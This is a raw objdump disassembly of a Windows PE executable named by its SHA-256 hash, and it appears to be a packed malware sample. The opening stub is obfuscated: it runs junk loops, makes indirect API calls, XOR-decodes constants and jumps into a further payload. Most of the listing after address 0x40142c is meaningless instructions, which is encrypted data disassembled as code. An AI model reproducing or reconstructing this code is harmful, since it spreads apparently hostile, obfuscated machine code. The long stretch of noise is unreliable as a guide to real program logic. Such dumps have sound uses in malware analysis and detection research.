
2a389c51349d6c3f0180538b64e1939fc8cff79fa3a2aa992044460e18415725.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c56
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d62
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237e2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238a9
  4012ea:	push   0x42392d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	jne    0x4013d1
  40143f:	in     eax,0x8d
  401441:	bound  esp,QWORD PTR [edx+0x62]
  401444:	(bad)  
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	xchg   esi,eax
  401456:	dec    eax
  401457:	jb     0x40149b
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   ebx,eax
  401504:	sub    ebx,esp
  401506:	jb     0x40149d
  401508:	stos   DWORD PTR es:[edi],eax
  401509:	ficom  DWORD PTR [edx-0x2a]
  40150c:	retf   0x5149
  40150f:	out    0xad,al
  401511:	out    0xa9,eax
  401513:	add    ecx,ebx
  401515:	push   ebp
  401516:	jo     0x401545
  401518:	addr16 push esp
  40151a:	adc    BYTE PTR [edx+0x6f],bl
  40151d:	cwde   
  40151e:	mov    esi,DWORD PTR [ebx]
  401520:	inc    ebx
  401521:	into   
  401522:	pop    ds
  401523:	cmp    eax,0xa4faa3ea
  401528:	xor    eax,0x7ce3c527
  40152d:	cmp    ebx,DWORD PTR [eax+0x70]
  401530:	add    eax,0x6bcece5d
  401535:	shl    ah,cl
  401537:	inc    ebp
  401538:	sub    dl,0xc2
  40153b:	push   ss
  40153c:	xor    ecx,0x10
  40153f:	mov    eax,0xe2226f87
  401544:	lods   eax,DWORD PTR ds:[esi]
  401545:	mov    ch,0x2b
  401547:	jo     0x4014fe
  401549:	lea    ecx,ds:0xf973355e
  40154f:	shl    BYTE PTR [ebp+0x542bab36],0xc4
  401556:	cmp    DWORD PTR [edx+0x1e],esp
  401559:	dec    edi
  40155a:	add    edi,DWORD PTR [edx-0x26]
  40155d:	ins    DWORD PTR es:[edi],dx
  40155e:	xchg   ebx,eax
  40155f:	push   edx
  401560:	mov    cl,0x2d
  401562:	adc    al,0x1f
  401564:	lods   al,BYTE PTR ds:[esi]
  401565:	fwait
  401566:	ret    
  401567:	ret    0x68a9
  40156a:	jmp    0x44e388fb
  40156f:	jmp    0x4015a1
  401571:	or     eax,0x1cb5ed1d
  401576:	stc    
  401577:	inc    esp
  401578:	sbb    eax,0x6712119e
  40157d:	xchg   esp,eax
  40157e:	cmpps  xmm5,XMMWORD PTR [edi+edx*8-0x72a95344],0x4d
  401587:	stc    
  401588:	mov    eax,0x738565ec
  40158d:	aas    
  40158e:	xchg   ebp,eax
  40158f:	fwait
  401590:	add    al,ch
  401592:	mov    ds:0x596aafc,al
  401597:	jo     0x4015ba
  401599:	mov    dl,0xef
  40159b:	and    DWORD PTR [edx+0x2e],0xffffffe7
  40159f:	arpl   WORD PTR [edi],sp
  4015a1:	jp     0x401612
  4015a3:	adc    BYTE PTR [edi+ebx*4-0x4868f891],ah
  4015aa:	sub    DWORD PTR [ebx+0x57],esp
  4015ad:	(bad)  
  4015ae:	pop    esi
  4015af:	or     eax,0xd4502d8d
  4015b4:	(bad)  
  4015b5:	pop    ebp
  4015b6:	xchg   ebx,eax
  4015b7:	loop   0x40154a
  4015b9:	cmp    al,0x6e
  4015bb:	int    0x5b
  4015bd:	adc    ebp,DWORD PTR [ebp-0x41]
  4015c0:	das    
  4015c1:	je     0x401619
  4015c3:	sahf   
  4015c4:	cmc    
  4015c5:	or     al,0x78
  4015c7:	or     bl,BYTE PTR [esi+0x72]
  4015ca:	adc    eax,0x398836b8
  4015cf:	cli    
  4015d0:	les    edx,FWORD PTR ds:0xed3e7261
  4015d6:	jnp    0x40157e
  4015d8:	or     ch,BYTE PTR [edx-0x7b]
  4015db:	jo     0x401567
  4015dd:	pop    ss
  4015de:	sbb    eax,0x5764aa61
  4015e3:	xchg   ebp,eax
  4015e4:	and    al,0x80
  4015e6:	(bad)  
  4015e7:	rol    BYTE PTR [ebp-0x5a],0x3e
  4015eb:	cmp    eax,0x70c0e5c3
  4015f0:	add    esi,DWORD PTR [edx+0x2fb3ae89]
  4015f6:	xchg   ebp,eax
  4015f7:	mov    esi,0x9c2f807e
  4015fc:	pushf  
  4015fd:	les    ecx,FWORD PTR [ebx]
  4015ff:	loop   0x401679
  401601:	push   ebx
  401602:	push   ss
  401603:	jmp    0x1651:0xc20dbc26
  40160a:	retf   0x89e4
  40160d:	repnz push ds
  40160f:	out    0x9,al
  401611:	imul   esp,ebx,0x99649da7
  401617:	sbb    eax,ecx
  401619:	and    esp,0x5ec014e8
  40161f:	mov    eax,ds:0xb6b715ba
  401624:	out    dx,al
  401625:	or     eax,0xf7920f57
  40162a:	and    DWORD PTR [esi+0x2a],ebp
  40162d:	nop
  40162e:	xchg   DWORD PTR [edi+0x5ea076c7],edi
  401634:	jecxz  0x40162a
  401636:	outs   dx,BYTE PTR ds:[esi]
  401637:	mov    ?,WORD PTR [edx]
  401639:	adc    ebp,DWORD PTR [edi+esi*8+0x57b530f0]
  401640:	loope  0x40162a
  401642:	call   0x50a1:0xdbb083d8
  401649:	xchg   ecx,eax
  40164a:	sbb    eax,0x82d87fcf
  40164f:	pop    esi
  401650:	pop    edi
  401651:	and    esi,DWORD PTR [edx-0x6c]
  401654:	bsf    eax,DWORD PTR ds:0xa90b1680
  40165b:	fldenv [ebp-0x66d1e1e5]
  401661:	sbb    DWORD PTR [edi+0x76],edi
  401664:	jno    0x4016c5
  401666:	mov    ch,0xfa
  401668:	pop    eax
  401669:	sbb    ah,cl
  40166b:	xor    DWORD PTR [ecx+ebx*2+0x29375fc6],ebp
  401672:	add    bl,BYTE PTR [edi+ecx*1]
  401675:	leave  
  401676:	popf   
  401677:	scas   al,BYTE PTR es:[edi]
  401678:	ret    
  401679:	ss cmp dl,dh
  40167c:	bndstx [esi],(bad)
  40167f:	mov    BYTE PTR [edx],dl
  401681:	and    cl,BYTE PTR [edi-0x45ce8b38]
  401687:	cmc    
  401688:	xchg   ebx,eax
  401689:	push   ebp
  40168a:	mov    dl,0x4c
  40168c:	mov    al,ds:0xcdf455d
  401691:	loopne 0x401620
  401693:	cmp    al,0x89
  401695:	sbb    DWORD PTR [ecx],ebx
  401697:	adc    al,0xdb
  401699:	mov    esi,0xb21f9c10
  40169e:	push   ecx
  40169f:	push   ss
  4016a0:	(bad)  
  4016a1:	icebp  
  4016a2:	mov    ecx,0xc6297d26
  4016a7:	xchg   ebp,eax
  4016a8:	int    0x3b
  4016aa:	lods   eax,DWORD PTR ds:[esi]
  4016ab:	push   cs
  4016ac:	xor    eax,0x14efcfab
  4016b1:	mov    al,ds:0x527758c1
  4016b6:	enter  0xcf65,0x57
  4016ba:	pop    eax
  4016bb:	pop    edi
  4016bc:	shl    DWORD PTR [esi+0x2b],1
  4016bf:	in     al,dx
  4016c0:	mov    ebx,DWORD PTR [edi+0x0]
  4016c3:	xchg   ebx,eax
  4016c4:	hlt    
  4016c5:	dec    edi
  4016c6:	pop    ds
  4016c7:	dec    ecx
  4016c8:	retf   
  4016c9:	adc    eax,0x49a9a9dd
  4016ce:	xor    BYTE PTR [ecx],bh
  4016d0:	push   ecx
  4016d1:	adc    edx,ebp
  4016d3:	mov    ecx,0xf6136583
  4016d8:	aam    0xba
  4016da:	fild   QWORD PTR [ebx-0x65]
  4016dd:	test   DWORD PTR ds:0xd38ebd57,ebp
  4016e3:	mov    ch,0x7
  4016e5:	cmp    BYTE PTR [edx],dh
  4016e7:	sbb    DWORD PTR [ebx],eax
  4016e9:	cmp    al,0x59
  4016eb:	leave  
  4016ec:	dec    ebx
  4016ed:	data16 jne 0x4016c8
  4016f0:	xchg   ebx,eax
  4016f1:	xchg   ebx,eax
  4016f2:	xchg   edi,eax
  4016f3:	adc    ah,BYTE PTR ds:0x3b8ff9a0
  4016f9:	mov    dh,0x2f
  4016fb:	dec    esp
  4016fc:	sbb    DWORD PTR [edx],edx
  4016fe:	es xor al,0x3d
  401701:	icebp  
  401702:	lock enter 0x908d,0x79
  401707:	call   0xccdd:0xb69c816e
  40170e:	or     eax,0xad664ac8
  401713:	mov    eax,0xc88a1030
  401718:	inc    esp
  401719:	or     bh,BYTE PTR [ecx-0x42]
  40171c:	add    DWORD PTR [ebx],ebx
  40171e:	and    BYTE PTR [esi],al
  401720:	jo     0x40172d
  401722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401723:	das    
  401724:	loope  0x4016f9
  401726:	pop    esp
  401727:	inc    ebp
  401728:	sub    al,0x41
  40172a:	in     eax,0xd4
  40172c:	mov    DWORD PTR [edi-0x39],ebx
  40172f:	mov    ebx,0x8b3be99a
  401734:	inc    edx
  401735:	sub    DWORD PTR [esi],ecx
  401737:	or     ecx,DWORD PTR [esi]
  401739:	dec    BYTE PTR [edx+esi*1+0x3b6df9d2]
  401740:	jp     0x401776
  401742:	xor    bl,BYTE PTR [ecx+0x69]
  401745:	mov    esp,0x7d1fe39e
  40174a:	pop    edx
  40174b:	(bad)  
  40174c:	out    dx,al
  40174d:	aad    0x92
  40174f:	jg     0x401785
  401751:	ret    0xad81
  401754:	test   BYTE PTR [ebx],0x7e
  401757:	ins    DWORD PTR es:[edi],dx
  401758:	dec    eax
  401759:	clc    
  40175a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40175b:	daa    
  40175c:	adc    eax,0xa3e5a947
  401761:	push   esp
  401762:	arpl   WORD PTR [eax+0x52],dx
  401765:	mov    ah,0x1a
  401767:	lods   eax,DWORD PTR ds:[esi]
  401768:	repz xor al,0xe7
  40176b:	mov    dl,0x4a
  40176d:	mov    ecx,0x6370cbbe
  401772:	stos   BYTE PTR es:[edi],al
  401773:	icebp  
  401774:	popf   
  401775:	jno    0x4017ea
  401777:	lea    esp,[ebx-0x69682c11]
  40177d:	in     eax,0xae
  40177f:	repnz lods al,BYTE PTR ds:[esi]
  401781:	pop    es
  401782:	(bad)  
  401783:	and    DWORD PTR [ebx-0x23bb66e9],esp
  401789:	int3   
  40178a:	add    al,0x3b
  40178c:	lock rol bh,1
  40178f:	adc    DWORD PTR [ebx-0x34e05095],0xffffff8c
  401796:	repnz or al,BYTE PTR [ebx-0x64ac431c]
  40179d:	xor    DWORD PTR gs:0x48897e14,edi
  4017a4:	ret    0x3227
  4017a7:	ret    
  4017a8:	mov    eax,ds:0x166f2b5c
  4017ad:	cmp    eax,0xbbf7fed5
  4017b2:	mov    BYTE PTR [eax+edx*4+0x3048598c],dh
  4017b9:	lds    esp,FWORD PTR [ebx-0x7dafd346]
  4017bf:	and    BYTE PTR [eax+0x67],dh
  4017c2:	mov    cl,0x2c
  4017c4:	adc    edi,edi
  4017c6:	imul   esp,DWORD PTR [eax-0x4b],0x19a01ba7
  4017cd:	cmp    esi,DWORD PTR [eax+0x3ecc6c7]
  4017d3:	push   eax
  4017d4:	mov    bl,0x72
  4017d6:	adc    DWORD PTR [ecx+eax*2],ebx
  4017d9:	js     0x4017d8
  4017db:	icebp  
  4017dc:	xor    ecx,eax
  4017de:	jno    0x4017bd
  4017e0:	dec    edi
  4017e1:	push   ebp
  4017e2:	mov    ds:0x10023474,al
  4017e7:	and    dh,ch
  4017e9:	(bad)  
  4017ea:	sbb    bh,dl
  4017ec:	dec    edi
  4017ed:	out    0x8e,eax
  4017ef:	dec    ebx
  4017f0:	int    0x38
  4017f2:	mov    WORD PTR [eax],es
  4017f4:	push   es
  4017f5:	adc    eax,0x74f61098
  4017fa:	push   ebp
  4017fb:	stos   BYTE PTR es:[edi],al
  4017fc:	add    al,BYTE PTR ds:0x316f6208
  401802:	mov    bl,BYTE PTR [eax-0x33]
  401805:	mov    ds:0xc82ca960,eax
  40180a:	push   ss
  40180b:	(bad)  
  40180e:	mov    bh,0x26
  401810:	fwait
  401811:	mov    ecx,0xd31aa5ef
  401816:	fsubp  st(5),st
  401818:	jns    0x40184d
  40181a:	fldcw  WORD PTR [eax-0x10b57045]
  401820:	adc    edi,ebp
  401822:	rol    DWORD PTR [edx],cl
  401824:	sbb    BYTE PTR [esi],bh
  401826:	pop    eax
  401827:	add    al,0xd4
  401829:	ret    0x48a1
  40182c:	and    esi,DWORD PTR [eax]
  40182e:	repnz mov bh,0xe4
  401831:	and    esp,DWORD PTR [edx+0x58]
  401834:	pop    esp
  401835:	mov    al,ds:0xc9c22632
  40183a:	mul    BYTE PTR fs:[edi-0x4c]
  40183e:	cld    
  40183f:	ror    BYTE PTR [ecx],1
  401841:	mov    edx,ecx
  401843:	push   ebp
  401844:	call   0x80c0fe70
  401849:	or     DWORD PTR [ecx+0x259aeba8],esi
  40184f:	js     0x40181f
  401851:	or     esi,DWORD PTR [edi+0x56ef66a5]
  401857:	out    0x3,eax
  401859:	frstor [ebx-0x3e47c36d]
  40185f:	fimul  WORD PTR [ecx]
  401861:	mov    bh,0xf5
  401863:	add    cl,al
  401865:	aaa    
  401866:	jno    0x401836
  401868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401869:	frstor [ebp+0x146e8d53]
  40186f:	add    BYTE PTR [edx+ebp*1-0x1],bh
  401873:	cwde   
  401874:	lock adc esi,ebx
  401877:	xor    dl,BYTE PTR [ebx+0x16e41117]
  40187d:	sbb    bl,BYTE PTR [ecx+eiz*4]
  401880:	sbb    ebx,edx
  401882:	pop    edx
  401883:	add    ah,BYTE PTR [ebx-0x75]
  401886:	and    eax,esi
  401888:	cmp    edi,esp
  40188a:	pop    esi
  40188b:	pop    edi
  40188c:	or     eax,0x68d85b7d
  401891:	inc    ecx
  401892:	jbe    0x401850
  401894:	mov    ecx,0x2e5aeb07
  401899:	xchg   esi,eax
  40189a:	test   BYTE PTR [ebx+0x68],bh
  40189d:	and    bl,dh
  40189f:	loope  0x40184f
  4018a1:	int    0x97
  4018a3:	ret    0x6dcd
  4018a6:	stos   BYTE PTR es:[edi],al
  4018a7:	cdq    
  4018a8:	mov    ecx,0xeede7135
  4018ad:	cld    
  4018ae:	mov    ebp,es
  4018b0:	(bad)  
  4018b1:	and    dl,ah
  4018b3:	iret   
  4018b4:	push   ecx
  4018b5:	add    eax,0x7491d378
  4018ba:	mov    ah,0x99
  4018bc:	pushf  
  4018bd:	daa    
  4018be:	leave  
  4018bf:	cwde   
  4018c0:	jle    0x4018d0
  4018c2:	and    DWORD PTR [eax],ebp
  4018c4:	clc    
  4018c5:	cs jo  0x40190a
  4018c8:	outs   dx,DWORD PTR es:[esi]
  4018ca:	ss push cs
  4018cc:	fnclex 
  4018ce:	shr    DWORD PTR [ecx-0x57],cl
  4018d1:	push   eax
  4018d2:	jb     0x40193c
  4018d4:	and    al,0x83
  4018d6:	xchg   eax,esi
  4018d8:	jle    0x401950
  4018da:	gs mov edx,0xf2c94e6b
  4018e0:	dec    esi
  4018e1:	jns    0x40192e
  4018e3:	sbb    al,0x52
  4018e5:	jb     0x401961
  4018e7:	inc    edi
  4018e8:	mov    fs,WORD PTR [edi+eax*1-0x3ef1c377]
  4018ef:	pop    eax
  4018f0:	outs   dx,DWORD PTR ds:[esi]
  4018f1:	push   edi
  4018f2:	aas    
  4018f3:	fnsave [eax+0x45]
  4018f6:	xor    al,0x43
  4018f8:	adc    BYTE PTR [edx+0x42],bl
  4018fb:	enter  0xbba5,0x33
  4018ff:	or     DWORD PTR [eax],edi
  401901:	inc    ebx
  401902:	adc    BYTE PTR [ecx+ebp*2],0x40
  401906:	shl    BYTE PTR [esp+esi*4-0x468b09b1],cl
  40190d:	or     al,0x9b
  40190f:	ins    BYTE PTR es:[edi],dx
  401910:	rcl    DWORD PTR [edi+ecx*2],cl
  401913:	rol    BYTE PTR [eax],0x57
  401916:	jmp    0xd6b0b6f5
  40191b:	pop    ss
  40191c:	mov    esi,edx
  40191e:	jge    0x4018ad
  401920:	xor    eax,0x11a8ff26
  401925:	mov    al,0x7b
  401927:	dec    esp
  401928:	icebp  
  401929:	inc    esp
  40192a:	(bad)  
  40192d:	aas    
  40192e:	dec    ecx
  40192f:	cs lahf 
  401931:	stos   BYTE PTR es:[edi],al
  401932:	jmp    DWORD PTR [ebx+0x62b047e5]
  401938:	and    DWORD PTR [edi+0x3988ee23],esp
  40193e:	inc    ebx
  40193f:	pop    ebx
  401940:	sub    ah,BYTE PTR [edi]
  401942:	cmp    al,ch
  401944:	and    bl,al
  401946:	(bad)  
  401947:	arpl   WORD PTR [eax],di
  401949:	shr    DWORD PTR [ebp-0x4348f3b],1
  40194f:	push   0x63
  401951:	std    
  401952:	(bad)  
  401953:	fcomp  QWORD PTR [ebx-0x4e64b72e]
  401959:	or     DWORD PTR [edx-0x6b],eax
